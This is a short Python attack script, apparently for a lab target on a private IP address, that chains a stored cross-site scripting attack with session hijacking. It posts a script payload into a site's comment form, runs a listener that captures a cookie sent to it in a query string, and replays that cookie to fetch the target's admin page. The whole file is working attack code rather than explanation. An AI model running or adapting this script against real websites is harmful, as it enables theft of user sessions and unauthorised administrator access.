from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from sys import argv
from  urllib import parse
import threading
import time
import  requests

#use: serverth2.py port

def xss_attack():
	uri= "http://172.16.113.150/post_comment.php?id=2"
	payload ={'title':'Confuse', 'author':'nyanyi','text':'<script>alert(6)</script>','submit':'submit'}
	r=requests.post(uri, data=payload)
	print("xss attack")
	
def get_admin(cookie_value):
	uri_admin="http://172.16.113.150/admin/"
	cookie_admin={'Cookie': cookie_value}
	print(cookie_admin)
	r = requests.get(uri_admin, headers=cookie_admin)
	print(r.text)

#Server port assignment
port = int(argv[1])

#inheritance of SimpleHTTPServer
class Handler(SimpleHTTPRequestHandler):
	def do_GET(self):
		global control
		parsed_path = parse.urlparse(self.path)
		message_parts = [
            	'CLIENT VALUES:',
            	'>client_address={} ({})'.format(
                self.client_address,
                self.address_string()),
            	'>command={}'.format(self.command),
            	'>path={}'.format(self.path),
            	'>real path={}'.format(parsed_path.path),
            	'>query=>{}'.format(parsed_path.query),
            	'>request_version={}'.format(self.request_version),
		'',
           	'HEADERS RECEIVED:',
        	]
		for name, value in sorted(self.headers.items()):
			message_parts.append(
				'>{}={}'.format(name, value.rstrip())
			)
		message_parts.append('')
		message = '\r\n'.join(message_parts)
		print(message)
		cookie= parsed_path.query
		print(cookie)
		if(cookie):
			print("Bye, your cookie is", cookie)
			# server down
			thread2.start()
			get_admin(cookie)
		
		SimpleHTTPRequestHandler.do_GET(self)


#main
xss_attack()
server= TCPServer(("", port), Handler)
print("Start server")
thread=threading.Thread(target=server.serve_forever)
thread.start()
thread2=threading.Thread(target=server.shutdown)

